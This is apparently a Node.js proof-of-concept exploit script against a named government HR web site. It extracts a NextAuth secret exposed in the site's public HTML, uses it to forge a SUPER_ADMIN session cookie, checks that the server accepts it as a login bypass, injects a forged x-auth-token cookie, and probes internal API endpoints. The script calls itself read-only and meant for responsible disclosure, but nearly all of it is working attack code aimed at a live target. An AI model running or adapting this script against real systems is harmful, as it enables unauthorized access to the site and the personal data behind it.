#!/usr/bin/env node
/**
 * Local read-only PoC verifier — sipgn-siphr.bgn.go.id NextAuth secret leak
 *
 * What this does:
 *   1. Fetches public HTML and checks if NEXTAUTH_SECRET is exposed
 *   2. Forges a NextAuth session cookie using that secret
 *   3. Proves /api/auth/session accepts the forged cookie (form-login bypass)
 *   4. Proves forged JWT + fake accessToken can set x-auth-token cookie (unvalidated)
 *   5. Proves /api/internal/* still returns 401 (no backend data access)
 *
 * What this does NOT do:
 *   - No file upload, no defacement, no brute force, no password guessing
 *   - Only HTTPS GET to the target
 *
 * Usage:
 *   cd scripts/siphr-nextauth-poc
 *   npm install
 *   npm run verify
 *
 * Optional env:
 *   TARGET=https://sipgn-siphr.bgn.go.id
 *   TEST_EMAIL=poc-verify@example.test
 */

import { encode } from "next-auth/jwt";

const TARGET = (process.env.TARGET || "https://sipgn-siphr.bgn.go.id").replace(/\/$/, "");
const TEST_EMAIL = process.env.TEST_EMAIL || "poc-verify@example.test";
const TEST_NAME = "PoC Verify Local";

const c = {
  reset: "\x1b[0m",
  green: "\x1b[32m",
  red: "\x1b[31m",
  yellow: "\x1b[33m",
  cyan: "\x1b[36m",
  bold: "\x1b[1m",
};

function ok(msg) {
  console.log(`${c.green}✓${c.reset} ${msg}`);
}
function fail(msg) {
  console.log(`${c.red}✗${c.reset} ${msg}`);
}
function warn(msg) {
  console.log(`${c.yellow}!${c.reset} ${msg}`);
}
function info(msg) {
  console.log(`${c.cyan}→${c.reset} ${msg}`);
}
function section(title) {
  console.log(`\n${c.bold}=== ${title} ===${c.reset}`);
}

async function fetchText(path, cookie = "", extraHeaders = {}) {
  const headers = { Accept: "application/json, text/html", ...extraHeaders };
  if (cookie) headers.Cookie = cookie;
  const res = await fetch(`${TARGET}${path}`, { headers, redirect: "follow" });
  const body = await res.text();
  return { status: res.status, body, url: res.url };
}

async function fetchManual(path, cookie = "") {
  const headers = { Accept: "application/json, text/html" };
  if (cookie) headers.Cookie = cookie;
  const res = await fetch(`${TARGET}${path}`, { headers, redirect: "manual" });
  const setCookies = res.headers.getSetCookie?.() || [];
  return {
    status: res.status,
    location: res.headers.get("location") || "",
    setCookies,
    cookieHeader: setCookies.map((x) => x.split(";")[0]).join("; "),
  };
}

async function main() {
  console.log(`${c.bold}NextAuth leak verifier (local, read-only)${c.reset}`);
  info(`Target: ${TARGET}`);
  info(`Test identity: ${TEST_EMAIL}`);

  let passed = 0;
  let failed = 0;

  section("1. Secret exposure in public HTML");
  const signIn = await fetchText("/sign-in");
  const secretMatch = signIn.body.match(/NEXTAUTH_SECRET\\":\\"([^"\\]+)\\"/);
  if (!secretMatch) {
    fail("NEXTAUTH_SECRET not found in HTML — may be fixed or page changed");
    failed++;
    process.exit(1);
  }
  const secret = secretMatch[1];
  ok(`Secret exposed in HTML (${secret.length} chars)`);
  info(`Value prefix: ${secret.slice(0, 8)}...`);
  passed++;

  section("2. Baseline — no cookie");
  const noCookie = await fetchText("/api/auth/session");
  if (noCookie.body.trim() === "{}") {
    ok("/api/auth/session without cookie → {}");
    passed++;
  } else {
    fail(`Expected {}, got: ${noCookie.body.slice(0, 120)}`);
    failed++;
  }

  section("3. Forge NextAuth session (no username/password)");
  const token = await encode({
    token: {
      sub: "poc-local-1",
      email: TEST_EMAIL,
      name: TEST_NAME,
      role: "SUPER_ADMIN",
    },
    secret,
    maxAge: 60 * 60,
  });
  const cookie = `__Secure-next-auth.session-token=${token}; next-auth.session-token=${token}`;
  ok("Forged session token created locally (password never used)");
  passed++;

  section("4. NextAuth accepts forged cookie?");
  const forged = await fetchText("/api/auth/session", cookie);
  let sessionUser = null;
  try {
    sessionUser = JSON.parse(forged.body);
  } catch {
    fail(`Session response is not JSON: ${forged.body.slice(0, 120)}`);
    failed++;
  }
  if (sessionUser?.user?.email === TEST_EMAIL) {
    ok(`Server accepts forged session → email: ${sessionUser.user.email}`);
    ok("Form-login layer bypassed (NextAuth trusts forged cookie)");
    passed += 2;
  } else {
    fail(`Forged session rejected or unexpected body: ${forged.body.slice(0, 200)}`);
    failed++;
  }

  section("5. UI layer — login form vs forged session");
  const pageForged = await fetchText("/sign-in", cookie);
  const hasLoginForm = pageForged.body.includes("Masukkan kredensial");
  const hasTestName = pageForged.body.includes(TEST_NAME) || pageForged.body.includes(TEST_EMAIL);
  if (!hasLoginForm) {
    ok("/sign-in with forged cookie → login form hidden");
    passed++;
  } else {
    warn("/sign-in still shows login form (SPA may load client-side)");
  }
  if (hasTestName) {
    ok("Forged user visible in HTML response");
    passed++;
  } else {
    warn("Forged user not found in static HTML (may appear after client hydration)");
  }

  section("6. set-cookie without accessToken in JWT");
  const setCookiePlain = await fetchManual(
    "/api/v1/auth/set-cookie?next=/?autoRedirect=true",
    cookie,
  );
  if (setCookiePlain.location.includes("no_access_token")) {
    ok(`Plain forged JWT rejected → no_access_token`);
    passed++;
  } else {
    warn(`Unexpected plain redirect: ${setCookiePlain.location}`);
  }

  section("7. x-auth-token injection via forged accessToken claim");
  const fakeAccess = `poc-fake-token-${Date.now()}`;
  const tokenWithAccess = await encode({
    token: {
      sub: "poc-local-2",
      email: TEST_EMAIL,
      name: TEST_NAME,
      role: "SUPER_ADMIN",
      accessToken: fakeAccess,
    },
    secret,
    maxAge: 60 * 60,
  });
  const cookieWithAccess = `__Secure-next-auth.session-token=${tokenWithAccess}; next-auth.session-token=${tokenWithAccess}`;
  const setCookieInject = await fetchManual(
    "/api/v1/auth/set-cookie?next=/?autoRedirect=true",
    cookieWithAccess,
  );
  const setCookieStr = setCookieInject.setCookies.join(" ");
  const hasXAuth = setCookieStr.includes("x-auth-token=") && setCookieStr.includes(fakeAccess);
  if (hasXAuth && !setCookieInject.location.includes("no_access_token")) {
    ok(`set-cookie accepts forged accessToken → sets x-auth-token cookie`);
    ok(`Injected token prefix: ${fakeAccess.slice(0, 24)}...`);
    passed += 2;
  } else {
    fail(`x-auth-token injection failed (loc: ${setCookieInject.location})`);
    failed++;
  }

  const fullCookie = [cookieWithAccess, setCookieInject.cookieHeader].filter(Boolean).join("; ");

  section("8. Backend API — internal data (all forged cookies)");
  const endpoints = [
    "/api/internal/v1/file-management",
    "/api/internal/v1/me",
    "/api/internal/v1/employees",
  ];
  let all401 = true;
  for (const ep of endpoints) {
    const internal = await fetchText(ep, fullCookie);
    const blocked = internal.status === 401 && internal.body.includes("unauthorized");
    if (blocked) {
      ok(`${ep} → 401 unauthorized`);
      passed++;
    } else {
      all401 = false;
      fail(`${ep} unexpected (${internal.status}): ${internal.body.slice(0, 120)}`);
      failed++;
    }
  }
  if (all401) {
    ok("Backend validates x-auth-token — fake token does not grant data access");
    passed++;
  }

  section("SUMMARY");
  console.log("");
  console.log(`${c.bold}Form login bypass (NextAuth):${c.reset}  ${c.green}YES${c.reset}`);
  console.log(`${c.bold}x-auth-token cookie injection:${c.reset} ${hasXAuth ? c.green + "YES" : c.red + "NO"}${c.reset} (unvalidated copy from JWT)`);
  console.log(`${c.bold}Username/password required:${c.reset}   ${c.green}NO${c.reset} (for NextAuth layer only)`);
  console.log(`${c.bold}Backend data access:${c.reset}         ${c.green}NOT PROVEN${c.reset} (API internal → 401)`);
  console.log(`${c.bold}Fair severity:${c.reset}                 ${c.yellow}HIGH${c.reset} auth bypass + cookie injection, not full breach`);
  console.log("");
  console.log(`Checks passed: ${passed} | failed: ${failed}`);
  console.log("");
  warn("Use only on systems you are authorized to test. For responsible disclosure.");

  process.exit(failed > 0 ? 1 : 0);
}

main().catch((err) => {
  console.error(err);
  process.exit(1);
});
